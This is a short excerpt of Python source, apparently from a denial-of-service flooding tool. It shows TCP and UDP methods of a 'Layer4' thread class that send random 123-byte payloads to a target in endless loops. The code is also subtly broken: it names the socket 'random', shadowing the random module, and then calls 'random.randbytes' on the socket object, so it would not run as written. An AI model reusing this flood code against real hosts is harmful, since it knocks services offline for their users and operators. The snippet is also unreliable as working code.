...
class Layer4(Thread):
    ...
    def TCP(self) -> None:
        random = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as random:
            while Tools.send(random.randbytes(123)):
                continue
        Tools.safe_close(random)
    ...
    def UDP(self) -> None:
        random = None
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as random:
            while Tools.sendto(random.randbytes(123), self._target):
                continue
        Tools.safe_close(random)
